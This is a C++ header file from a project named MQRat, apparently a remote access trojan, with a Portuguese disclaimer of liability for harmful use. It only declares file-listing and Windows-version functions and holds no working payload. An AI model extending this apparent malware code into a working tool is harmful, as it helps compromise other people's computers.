/*
	This file is part of MQRat.
	
	Copyright (C) 2019  MQRat Project

	O autor não se responsabiliza por variantes (ou sources originais) deste software 
	que estejam sendo utilizadas para prejudicar terceiros.
*/

#ifndef API_HPP
#define API_HPP

#include <vector>
#include <string>

namespace API {
    class FileSystem {
        public:
            static std::vector<std::string> ListFiles();

            static std::string GetWindowsVersion();
    };
}

#endif

